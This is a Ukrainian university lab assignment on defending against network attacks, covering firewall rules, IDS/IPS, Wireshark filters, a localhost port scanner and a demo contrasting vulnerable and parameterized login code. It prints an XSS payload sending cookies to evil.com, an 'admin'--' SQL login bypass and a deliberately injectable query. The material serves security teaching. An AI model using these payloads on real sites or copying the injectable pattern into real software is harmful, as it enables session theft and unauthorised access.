---
title: "Програмні засоби захисту від мережевих атак"
type: lab
order: 8
labNumber: 9
subject: pmzi
duration: "4 академічні години"
equipment:
  - "ПК з встановленим Wireshark або tcpdump"
  - "Доступ до командного рядка з правами адміністратора"
  - "Python 3 для написання скриптів"
  - "Віртуальна машина (опціонально, для безпечних експериментів)"
preview: "Вивчення засобів захисту від атак з мережі Internet."
---

**Мета:** вивчити основні типи мережевих атак та програмні засоби захисту від них. Навчитися аналізувати мережевий трафік, налаштовувати брандмауер та виявляти вразливості.

**Обладнання:** ПК з встановленим Wireshark або tcpdump; Доступ до командного рядка з правами адміністратора; Python 3 для написання скриптів; Віртуальна машина (опціонально, для безпечних експериментів).

**Тривалість:** 4 академічні години.

## Передумови

| Вимога | Опис |
|--------|------|
| **Знання** | Лекція 7: Ідентифікація та аутентифікація. Загрози безпеці |
| **Навички** | Основи мережевих протоколів TCP/IP |
| **Середовище** | ПК з встановленим Wireshark або tcpdump |

## Теоретичні відомості

### 1 Типи мережевих атак

```
┌───────────────────────────────────────────────────────────────────────┐
│                    КЛАСИФІКАЦІЯ МЕРЕЖЕВИХ АТАК                        │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  ЗА МЕТОЮ:                                                            │
│  ├── Отримання доступу (Access attacks)                               │
│  │   ├── Підбір паролів (Brute force)                                 │
│  │   ├── Експлуатація вразливостей                                    │
│  │   └── Man-in-the-Middle (MITM)                                     │
│  │                                                                    │
│  ├── Відмова в обслуговуванні (DoS/DDoS)                              │
│  │   ├── SYN Flood                                                    │
│  │   ├── UDP Flood                                                    │
│  │   └── Amplification attacks                                        │
│  │                                                                    │
│  └── Розвідка (Reconnaissance)                                        │
│      ├── Сканування портів                                            │
│      ├── Сканування вразливостей                                      │
│      └── DNS enumeration                                              │
│                                                                       │
│  ЗА РІВНЕМ OSI:                                                       │
│  ├── L2: ARP spoofing, MAC flooding                                   │
│  ├── L3: IP spoofing, ICMP attacks                                    │
│  ├── L4: TCP/UDP attacks, port scanning                               │
│  └── L7: SQL injection, XSS, CSRF                                     │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```
### 2 Брандмауер (Firewall)

Брандмауер — це програмний або апаратний засіб, який фільтрує мережевий трафік за заданими правилами.

**Типи брандмауерів:**

Таблиця 1 — Типи брандмауерів

| Тип             | Рівень | Особливості                 |
|-----------------|--------|-----------------------------|
| Пакетний фільтр | L3-L4  | Фільтрація за IP, портами   |
| Stateful        | L3-L4  | Відстеження з'єднань        |
| Application     | L7     | Аналіз протоколів HTTP, FTP |
| Next-Gen (NGFW) | L3-L7  | DPI, IPS, антивірус         |

**Базові правила:**

```
┌───────────────────────────────────────────────────────────────────────┐
│                    ЛОГІКА ПРАВИЛ БРАНДМАУЕРА                          │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  Правила перевіряються ПОСЛІДОВНО (зверху вниз)                       │
│  Перше правило, що підходить, визначає долю пакета                    │
│                                                                       │
│  Приклад набору правил:                                               │
│  ┌─────────────────────────────────────────────────────────────────┐  │
│  │ 1. ALLOW TCP dst-port=443 (HTTPS)                               │  │
│  │ 2. ALLOW TCP dst-port=80  (HTTP)                                │  │
│  │ 3. ALLOW UDP dst-port=53  (DNS)                                 │  │
│  │ 4. ALLOW ICMP type=8      (ping request)                        │  │
│  │ 5. DENY ALL               (все інше заборонено)                 │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                       │
│  Принцип: "Deny by default" — заборонено все, крім явно дозволеного   │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```
### 3 IDS та IPS

**IDS (Intrusion Detection System)** — система виявлення вторгнень. Аналізує трафік і сповіщає про підозрілу активність.

**IPS (Intrusion Prevention System)** — система запобігання вторгненням. Не тільки виявляє, а й блокує атаки.

Таблиця 2 — Порівняння IDS та IPS

| Характеристика | IDS | IPS |
|----|----|----|
| Розташування | Поруч з трафіком (span port) | На шляху трафіку (inline) |
| Дія | Сповіщення | Блокування |
| Затримка | Мінімальна | Додає латентність |
| Помилкові спрацювання | Менш критичні | Можуть блокувати легітимний трафік |

**Методи виявлення:**

- **Сигнатурний**: пошук відомих патернів атак
- **Аномальний**: виявлення відхилень від нормальної поведінки
- **Евристичний**: аналіз підозрілої поведінки

### 4 Веб-вразливості (OWASP Top 10)

**SQL-ін'єкція:**

```
-- Вразливий код:
SELECT * FROM users WHERE login='$input' AND pass='$pass'

-- Атака:
login: admin'--
pass: anything

-- Результат:
SELECT * FROM users WHERE login='admin'--' AND pass='anything'
-- Коментар '--' ігнорує перевірку пароля
```
**XSS (Cross-Site Scripting):**

```
<!-- Вразливий код: -->
<p>Привіт, <?php echo $_GET['name']; ?></p>

<!-- Атака: -->
?name=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>

<!-- Результат: виконання JavaScript у браузері жертви -->
```
**Захист:**

- SQL: параметризовані запити (prepared statements)
- XSS: екранування виводу, Content Security Policy (CSP)

### 5 Інструменти

Таблиця 3 — Інструменти аналізу мережевої безпеки

| Інструмент | Призначення        | Команда           |
|------------|--------------------|-------------------|
| Wireshark  | Аналіз трафіку     | GUI-інтерфейс     |
| tcpdump    | Захоплення пакетів | `tcpdump -i eth0` |
| nmap       | Сканування портів  | `nmap -sV target` |
| netstat    | Перегляд з'єднань  | `netstat -an`     |
| iptables   | Брандмауер Linux   | `iptables -L`     |

## Приклад виконання

### Завдання 1: Аналіз мережевого трафіку

#### Windows (PowerShell)

```
# Перегляд активних TCP-з'єднань
Get-NetTCPConnection | Where-Object State -eq 'Established' |
    Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object RemoteAddress

# Перегляд активних UDP-з'єднань
Get-NetUDPEndpoint | Select-Object LocalPort, OwningProcess

# Визначення процесу за PID
Get-Process -Id 1234 | Select-Object Name, Path
```
#### Linux (bash)

```bash
# Активні з'єднання
ss -tunapl

# Або через netstat
netstat -tunapl | grep ESTABLISHED

# Захоплення HTTP-трафіку
sudo tcpdump -i eth0 port 80 -A | head -50
```
#### Wireshark

1. Запустіть Wireshark
2. Виберіть мережевий інтерфейс
3. Застосуйте фільтр: `http` або `tcp.port == 443`
4. Проаналізуйте захоплені пакети

**Корисні фільтри Wireshark:**

| Фільтр                                     | Опис                           |
|--------------------------------------------|--------------------------------|
| `ip.addr == 192.168.1.1`                   | Трафік з/на IP-адресу          |
| `tcp.port == 80`                           | HTTP-трафік                    |
| `http.request.method == "POST"`            | POST-запити                    |
| `dns`                                      | DNS-запити                     |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | SYN-пакети (початок з'єднання) |

### Завдання 2: Налаштування брандмауера

#### Windows Firewall (PowerShell з правами адміністратора)

```
# Перегляд поточних правил
Get-NetFirewallRule | Where-Object Enabled -eq True |
    Select-Object DisplayName, Direction, Action

# Створення правила: блокувати вхідні на порт 23 (Telnet)
New-NetFirewallRule -DisplayName "Block Telnet" `
    -Direction Inbound `
    -LocalPort 23 `
    -Protocol TCP `
    -Action Block

# Створення правила: дозволити вхідні на порт 443 (HTTPS)
New-NetFirewallRule -DisplayName "Allow HTTPS" `
    -Direction Inbound `
    -LocalPort 443 `
    -Protocol TCP `
    -Action Allow

# Видалення правила
Remove-NetFirewallRule -DisplayName "Block Telnet"

# Перевірка статусу брандмауера
Get-NetFirewallProfile | Select-Object Name, Enabled
```
#### Linux iptables

```bash
# Перегляд поточних правил
sudo iptables -L -n -v

# Дозволити вхідні на порт 80 (HTTP)
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Дозволити вхідні на порт 443 (HTTPS)
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Заблокувати вхідні з конкретної IP
sudo iptables -A INPUT -s 10.0.0.100 -j DROP

# Заборонити все інше (в кінці)
sudo iptables -A INPUT -j DROP

# Зберегти правила
sudo iptables-save > /etc/iptables.rules
```
### Завдання 3: Сканування портів

**Увага**: сканування портів без дозволу власника системи є незаконним. Використовуйте тільки на власних системах або з явного дозволу.

#### Перевірка відкритих портів локально

```
# Windows: перевірка прослуховуваних портів
Get-NetTCPConnection -State Listen |
    Select-Object LocalPort, OwningProcess |
    Sort-Object LocalPort

# Визначення процесів
Get-NetTCPConnection -State Listen |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            Port = $_.LocalPort
            Process = $proc.Name
            Path = $proc.Path
        }
    } | Sort-Object Port
# Linux
ss -tuln | grep LISTEN
```
#### Базове сканування портів (Python)

```python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host: str, port: int) -> tuple:
    """Перевіряє, чи відкритий порт."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return (port, True)
        return (port, False)
    except:
        return (port, False)

def scan_ports(host: str, ports: list) -> list:
    """Сканує список портів паралельно."""
    open_ports = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(lambda p: scan_port(host, p), ports)

    for port, is_open in results:
        if is_open:
            open_ports.append(port)

    return open_ports

# Сканування localhost
if __name__ == "__main__":
    target = "127.0.0.1"
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
                    443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080]

    print(f"Сканування {target}...")
    open_ports = scan_ports(target, common_ports)

    print(f"\nВідкриті порти:")
    for port in open_ports:
        service = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 443: "HTTPS", 445: "SMB",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-alt"
        }.get(port, "Unknown")
        print(f"  {port}/tcp - {service}")
```
### Завдання 4: Захист веб-застосунку

#### Демонстрація SQL-ін'єкції та захисту (Python)

```python
import sqlite3
import html

# Створення тестової бази даних
def setup_database():
    conn = sqlite3.connect(':memory:')
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            login TEXT NOT NULL,
            password TEXT NOT NULL,
            role TEXT DEFAULT 'user'
        )
    ''')

    cursor.execute("INSERT INTO users (login, password, role) VALUES ('admin', 'secret123', 'admin')")
    cursor.execute("INSERT INTO users (login, password, role) VALUES ('user1', 'pass1', 'user')")

    conn.commit()
    return conn

# ВРАЗЛИВИЙ КОД (НІКОЛИ НЕ ВИКОРИСТОВУЙТЕ!)
def vulnerable_login(conn, login: str, password: str):
    cursor = conn.cursor()
    # Небезпечна конкатенація рядків
    query = f"SELECT * FROM users WHERE login='{login}' AND password='{password}'"
    print(f"[ВРАЗЛИВИЙ] Запит: {query}")

    try:
        cursor.execute(query)
        result = cursor.fetchone()
        return result
    except sqlite3.Error as e:
        print(f"Помилка: {e}")
        return None

# БЕЗПЕЧНИЙ КОД (параметризований запит)
def safe_login(conn, login: str, password: str):
    cursor = conn.cursor()
    # Параметризований запит — захищений від ін'єкції
    query = "SELECT * FROM users WHERE login=? AND password=?"
    print(f"[БЕЗПЕЧНИЙ] Запит: SELECT * FROM users WHERE login=? AND password=?")
    print(f"[БЕЗПЕЧНИЙ] Параметри: ('{login}', '{password}')")

    cursor.execute(query, (login, password))
    result = cursor.fetchone()
    return result

def demo_sql_injection():
    print("=" * 60)
    print("ДЕМОНСТРАЦІЯ SQL-ІН'ЄКЦІЇ")
    print("=" * 60)

    conn = setup_database()

    # Звичайний вхід
    print("\n--- Звичайний вхід ---")
    result = vulnerable_login(conn, "admin", "secret123")
    print(f"Результат: {result}\n")

    # SQL-ін'єкція
    print("--- SQL-ін'єкція: admin'-- ---")
    result = vulnerable_login(conn, "admin'--", "anything")
    print(f"Результат: {result}")
    print("АТАКА УСПІШНА! Увійшли без пароля.\n")

    # Захист параметризованим запитом
    print("--- Той самий ввід через безпечний метод ---")
    result = safe_login(conn, "admin'--", "anything")
    print(f"Результат: {result}")
    print("Ін'єкція заблокована!")

    conn.close()

def demo_xss_protection():
    print("\n" + "=" * 60)
    print("ДЕМОНСТРАЦІЯ XSS ТА ЗАХИСТУ")
    print("=" * 60)

    malicious_input = '<script>alert("XSS")</script>'

    print(f"\nЗловмисний ввід: {malicious_input}")

    # Без захисту
    print(f"\nБез захисту (HTML): <p>Привіт, {malicious_input}</p>")
    print("НЕБЕЗПЕЧНО! Скрипт буде виконано в браузері.")

    # З екрануванням
    safe_output = html.escape(malicious_input)
    print(f"\nЗ екрануванням: <p>Привіт, {safe_output}</p>")
    print("Безпечно! Скрипт відображається як текст.")

if __name__ == "__main__":
    demo_sql_injection()
    demo_xss_protection()
```
**Очікуваний результат:**

```
============================================================
ДЕМОНСТРАЦІЯ SQL-ІН'ЄКЦІЇ
============================================================

--- Звичайний вхід ---
[ВРАЗЛИВИЙ] Запит: SELECT * FROM users WHERE login='admin' AND password='secret123'
Результат: (1, 'admin', 'secret123', 'admin')

--- SQL-ін'єкція: admin'-- ---
[ВРАЗЛИВИЙ] Запит: SELECT * FROM users WHERE login='admin'--' AND password='anything'
Результат: (1, 'admin', 'secret123', 'admin')
АТАКА УСПІШНА! Увійшли без пароля.

--- Той самий ввід через безпечний метод ---
[БЕЗПЕЧНИЙ] Запит: SELECT * FROM users WHERE login=? AND password=?
[БЕЗПЕЧНИЙ] Параметри: ('admin'--', 'anything')
Результат: None
Ін'єкція заблокована!

============================================================
ДЕМОНСТРАЦІЯ XSS ТА ЗАХИСТУ
============================================================

Зловмисний ввід: <script>alert("XSS")</script>

Без захисту (HTML): <p>Привіт, <script>alert("XSS")</script></p>
НЕБЕЗПЕЧНО! Скрипт буде виконано в браузері.

З екрануванням: <p>Привіт, &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>
Безпечно! Скрипт відображається як текст.
```
## Порядок виконання роботи

1. Отримати в викладача номер індивідуального варіанта.

2. **Аналіз мережевого трафіку:**

```
- Встановити Wireshark (якщо не встановлено)
- Запустити захоплення трафіку на основному інтерфейсі
- Відвідати кілька веб-сайтів (HTTP і HTTPS)
- Знайти та проаналізувати HTTP-запити
- Застосувати фільтри для виділення трафіку
```

3. **Налаштування брандмауера:**

```
- Переглянути поточні правила брандмауера
- Створити правило для блокування порту з варіанта
- Створити правило для дозволу порту з варіанта
- Перевірити роботу правил
- Видалити тестові правила
```

4. **Сканування портів:**

```
- Визначити відкриті порти на localhost
- Ідентифікувати процеси, що прослуховують порти
- Записати результати
```

5. **Захист веб-застосунку:**

```
- Запустити демонстраційний код SQL-ін'єкції
- Продемонструвати успішну атаку на вразливий код
- Продемонструвати блокування атаки безпечним кодом
- Повторити для XSS
```

6. Виконати індивідуальне завдання згідно з варіантом.

7. Оформити звіт та зробити висновок.

## Вимоги до звіту

Звіт оформлюється на бланку встановленого зразка і має містити:

- тему, мету та обладнання;
- постановку задачі за індивідуальним варіантом;
- знімки екрана Wireshark з фільтрами;
- команди та результати налаштування брандмауера;
- результати сканування портів з ідентифікацією сервісів;
- код та результати демонстрації SQL-ін'єкції та XSS;
- результат виконання індивідуального завдання;
- висновок про методи захисту від мережевих атак.

## Варіанти індивідуальних завдань

| № | Порт для блокування | Порт для дозволу | Додаткове завдання |
|----|----|----|----|
| 1 | 21 (FTP) | 443 (HTTPS) | Знайти в Wireshark DNS-запити. Які домени запитувалися? |
| 2 | 23 (Telnet) | 80 (HTTP) | Реалізувати детектор SYN-сканування (багато SYN без ACK). |
| 3 | 25 (SMTP) | 993 (IMAPS) | Знайти в трафіку User-Agent браузера. Яку інформацію він розкриває? |
| 4 | 110 (POP3) | 995 (POP3S) | Реалізувати фільтр для виявлення підозрілих POST-запитів. |
| 5 | 135 (RPC) | 3389 (RDP) | Порівняти HTTP та HTTPS трафік. Що видно в кожному? |
| 6 | 139 (NetBIOS) | 445 (SMB) | Знайти ARP-запити в трафіку. Для чого вони використовуються? |
| 7 | 143 (IMAP) | 587 (SMTP) | Реалізувати простий rate limiter для захисту від brute force. |
| 8 | 445 (SMB) | 22 (SSH) | Проаналізувати TLS handshake. Які версії протоколу використовуються? |
| 9 | 1433 (MSSQL) | 5432 (PostgreSQL) | Знайти ICMP-пакети. Що показує ping? |
| 10 | 3306 (MySQL) | 8080 (HTTP-alt) | Реалізувати перевірку на CSRF-токени. |
| 11 | 5900 (VNC) | 443 (HTTPS) | Знайти в трафіку cookies. Які дані вони містять? |
| 12 | 8080 (HTTP-alt) | 80 (HTTP) | Реалізувати whitelist IP-адрес у брандмауері. |
| 13 | 1521 (Oracle) | 443 (HTTPS) | Визначити операційну систему за TTL пакетів. |
| 14 | 27017 (MongoDB) | 443 (HTTPS) | Реалізувати логування всіх заблокованих з'єднань. |
| 15 | 6379 (Redis) | 443 (HTTPS) | Знайти в трафіку Referer заголовки. Яку інформацію вони розкривають? |
| 16 | 11211 (Memcached) | 443 (HTTPS) | Реалізувати детектор port knocking. |
| 17 | 5432 (PostgreSQL) | 3306 (MySQL) | Порівняти час відповіді різних сервісів. Що це показує? |
| 18 | 9200 (Elasticsearch) | 443 (HTTPS) | Реалізувати перевірку Content-Type для захисту API. |
| 19 | 15672 (RabbitMQ) | 443 (HTTPS) | Знайти в трафіку WebSocket-з'єднання. |
| 20 | 2375 (Docker) | 443 (HTTPS) | Реалізувати blacklist IP-адрес після 5 невдалих спроб. |

## Контрольні запитання

1. Що таке брандмауер? Які типи брандмауерів існують?
2. Чим відрізняється IDS від IPS? Коли краще використовувати кожен?
3. Які порти потрібно захищати в першу чергу і чому?
4. Як виявити сканування портів у мережевому трафіку?
5. Що таке SQL-ін'єкція? Як від неї захиститися?
6. Що таке XSS? Які типи XSS існують?
7. Що таке stateful firewall і чим він кращий за пакетний фільтр?
8. Як працює Content Security Policy (CSP)?
9. Що таке OWASP Top 10?
10. Чому HTTPS не захищає від всіх атак?

## Критерії оцінювання

Робота оцінюється за загальними критеріями курсу — див. [Критерії оцінювання лабораторних робіт](#/02-software-security-methods/grading).

## Cheat Sheet

```
┌───────────────────────────────────────────────────────────────────────┐
│                    ШПАРГАЛКА: МЕРЕЖЕВА БЕЗПЕКА                        │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  ФІЛЬТРИ WIRESHARK:                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐  │
│  │ http.request         → HTTP-запити                              │  │
│  │ tcp.port == 443      → HTTPS-трафік                             │  │
│  │ ip.addr == X.X.X.X   → Трафік з/на IP                           │  │
│  │ dns                  → DNS-запити                               │  │
│  │ tcp.flags.syn == 1   → SYN-пакети                               │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                       │
│  WINDOWS FIREWALL (PowerShell):                                       │
│  ┌─────────────────────────────────────────────────────────────────┐  │
│  │ Get-NetFirewallRule            → Список правил                  │  │
│  │ New-NetFirewallRule ...        → Створити правило               │  │
│  │ Remove-NetFirewallRule ...     → Видалити правило               │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                       │
│  LINUX IPTABLES:                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐  │
│  │ iptables -L           → Список правил                           │  │
│  │ iptables -A INPUT ... → Додати правило                          │  │
│  │ iptables -D INPUT ... → Видалити правило                        │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                       │
│  ЗАХИСТ ВІД ІН'ЄКЦІЙ:                                                 │
│  ┌─────────────────────────────────────────────────────────────────┐  │
│  │ SQL: cursor.execute(query, (param1, param2))                    │  │
│  │ XSS: html.escape(user_input)                                    │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```
